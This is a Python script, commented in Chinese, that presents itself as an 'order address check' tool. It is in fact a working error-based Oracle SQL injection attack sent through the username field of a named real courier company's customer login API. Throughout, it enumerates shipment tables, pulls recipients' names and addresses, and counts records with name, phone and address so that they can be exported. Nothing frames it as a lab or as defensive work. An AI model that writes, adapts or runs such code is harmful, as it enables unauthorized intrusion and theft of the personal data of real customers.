#!/usr/bin/env python3
"""
检查订单中的地址信息
"""

import requests
import json
import time

class AddressChecker:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        """发送SQL注入payload"""
        data = {"Username": payload, "Password": "test"}
        try:
            response = self.session.post(
                self.target_url,
                data=json.dumps(data),
                timeout=30
            )
            return response
        except:
            return None
    
    def extract_via_error(self, query):
        """使用Error-based注入提取数据"""
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def check_address_in_shipment(self):
        """检查SHIPMENT表的地址信息"""
        print("=" * 80)
        print("📍 SHIPMENT表地址信息统计（10月10日）")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("总订单数", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            
            ("有收件人地址", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND RECEIVER_ADDRESS IS NOT NULL"),
            
            ("有收件人街道", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND RECEIVER_STREET IS NOT NULL"),
            
            ("有收件人省份", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND RECEIVER_PROVINCE_ID IS NOT NULL"),
            
            ("有收件人区县", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND RECEIVER_DISTRICT_ID IS NOT NULL"),
            
            ("有发件人地址", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND SENDER_ADDRESS IS NOT NULL"),
        ]
        
        results = {}
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result} 条")
                results[name] = int(result) if result.isdigit() else 0
            time.sleep(1.5)
        
        # 计算百分比
        total = results.get("总订单数", 0)
        if total > 0:
            print(f"\n{'='*80}")
            print("📊 地址覆盖率:")
            print(f"{'='*80}")
            for key, value in results.items():
                if key != "总订单数":
                    percentage = (value / total) * 100
                    print(f"   {key:20} : {value:>6} / {total} ({percentage:.1f}%)")
        
        return results
    
    def check_address_in_e1e2ph(self):
        """检查E1E2_PH表的地址信息"""
        print("\n" + "=" * 80)
        print("📍 E1E2_PH表地址信息统计（10月10日）")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("总记录数", 
             f"SELECT COUNT(*) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("不同MABC数", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("有收件人地址(DIACHI)", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIACHI IS NOT NULL"),
            
            ("有收件人地址且非空", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIACHI IS NOT NULL AND LENGTH(DIACHI)>0"),
        ]
        
        results = {}
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
                results[name] = int(result) if result.isdigit() else 0
            time.sleep(1.5)
        
        return results
    
    def get_address_samples(self):
        """获取地址样本数据"""
        print("\n" + "=" * 80)
        print("📋 地址样本数据")
        print("=" * 80)
        
        date = '20251010'
        
        print("\n🔎 SHIPMENT表地址样本（前5条）:")
        for i in range(1, 6):
            # 获取CODE
            query_code = f"SELECT CODE FROM (SELECT CODE, ROWNUM AS RN FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND RECEIVER_ADDRESS IS NOT NULL) WHERE RN={i}"
            code = self.extract_via_error(query_code)
            
            if code:
                print(f"\n   样本 {i}:")
                print(f"   CODE: {code}")
                
                # 收件人地址
                query_addr = f"SELECT RECEIVER_ADDRESS FROM EMS.SHIPMENT WHERE CODE='{code}' AND ROWNUM=1"
                addr = self.extract_via_error(query_addr)
                if addr and addr != 'NULL':
                    # 截取前100个字符
                    addr_display = addr[:100] + "..." if len(addr) > 100 else addr
                    print(f"   收件地址: {addr_display}")
                
                # 收件人姓名
                query_name = f"SELECT RECEIVER_NAME FROM EMS.SHIPMENT WHERE CODE='{code}' AND ROWNUM=1"
                name = self.extract_via_error(query_name)
                if name:
                    print(f"   收件人: {name}")
                
                time.sleep(2)
        
        print("\n🔎 E1E2_PH表地址样本（前5条）:")
        for i in range(1, 6):
            # 获取有地址的MABC
            query_mabc = f"SELECT MABC FROM (SELECT DISTINCT MABC, ROWNUM AS RN FROM EMS.E1E2_PH WHERE NGAY='{date}' AND DIACHI IS NOT NULL AND LENGTH(DIACHI)>10) WHERE RN={i}"
            mabc = self.extract_via_error(query_mabc)
            
            if mabc:
                print(f"\n   样本 {i}:")
                print(f"   MABC: {mabc}")
                
                # 地址
                query_addr = f"SELECT DIACHI FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                addr = self.extract_via_error(query_addr)
                if addr and addr != 'NULL':
                    addr_display = addr[:100] + "..." if len(addr) > 100 else addr
                    print(f"   地址: {addr_display}")
                
                # 收件人
                query_name = f"SELECT NGUOINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
                name = self.extract_via_error(query_name)
                if name:
                    print(f"   收件人: {name}")
                
                time.sleep(2)
    
    def check_address_completeness(self):
        """检查地址完整性（姓名+电话+地址）"""
        print("\n" + "=" * 80)
        print("📊 完整信息统计（姓名+电话+地址）")
        print("=" * 80)
        
        date = '20251010'
        
        print("\n🔎 SHIPMENT表:")
        
        queries = [
            ("总订单", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}'"),
            
            ("有姓名+电话+地址", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND RECEIVER_NAME IS NOT NULL AND RECEIVER_PHONE IS NOT NULL AND RECEIVER_ADDRESS IS NOT NULL"),
            
            ("有姓名+电话", 
             f"SELECT COUNT(*) FROM EMS.SHIPMENT WHERE CREATE_DATE='{date}' AND RECEIVER_NAME IS NOT NULL AND RECEIVER_PHONE IS NOT NULL"),
        ]
        
        shipment_results = {}
        
        for name, query in queries:
            result = self.extract_via_error(query)
            if result and result.isdigit():
                shipment_results[name] = int(result)
                print(f"   {name:25} : {result}")
            time.sleep(1.5)
        
        print("\n🔎 E1E2_PH表:")
        
        queries2 = [
            ("总MABC", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}'"),
            
            ("有姓名+电话+地址", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL AND DIENTHOAINHAN IS NOT NULL AND DIACHI IS NOT NULL"),
            
            ("有姓名+电话", 
             f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH WHERE NGAY='{date}' AND NGUOINHAN IS NOT NULL AND DIENTHOAINHAN IS NOT NULL"),
        ]
        
        e1e2_results = {}
        
        for name, query in queries2:
            result = self.extract_via_error(query)
            if result and result.isdigit():
                e1e2_results[name] = int(result)
                print(f"   {name:25} : {result}")
            time.sleep(1.5)
        
        return shipment_results, e1e2_results
    
    def summarize_address_data(self, shipment_data, e1e2_data):
        """汇总地址数据"""
        print("\n" + "=" * 80)
        print("📊 地址数据汇总")
        print("=" * 80)
        
        print("\nSHIPMENT表（2,335个订单）:")
        s_total = shipment_data[0].get("总订单数", 0)
        s_with_addr = shipment_data[0].get("有收件人地址", 0)
        s_complete = shipment_data[1].get("有姓名+电话+地址", 0)
        
        if s_total > 0:
            print(f"   有地址: {s_with_addr}/{s_total} ({s_with_addr/s_total*100:.1f}%)")
            print(f"   完整信息（姓名+电话+地址）: {s_complete}/{s_total} ({s_complete/s_total*100:.1f}%)")
        
        print("\nE1E2_PH表（410个MABC）:")
        e_total = e1e2_data.get("不同MABC数", 0)
        e_with_addr = e1e2_data.get("有收件人地址且非空", 0)
        e_complete = shipment_data[1].get("有姓名+电话+地址", 0)
        
        if e_total > 0:
            print(f"   有地址: {e_with_addr}/{e_total} ({e_with_addr/e_total*100:.1f}%)")
        
        print(f"\n{'='*80}")
        print("✅ 结论:")
        print(f"{'='*80}")
        print(f"\n大部分订单都有收件人地址！")
        print(f"可以导出完整的：姓名 + 电话 + 地址")
    
    def run_check(self):
        """执行检查"""
        print("=" * 80)
        print("📍 订单地址信息检查")
        print("=" * 80)
        
        # 测试连接
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功")
        
        # 执行检查
        shipment_addr = self.check_address_in_shipment()
        e1e2_addr = self.check_address_in_e1e2ph()
        shipment_complete, e1e2_complete = self.check_address_completeness()
        self.get_address_samples()
        self.summarize_address_data((shipment_addr, shipment_complete), e1e2_addr)
        
        print("\n" + "=" * 80)
        print("🎉 检查完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    checker = AddressChecker(target_url)
    checker.run_check()
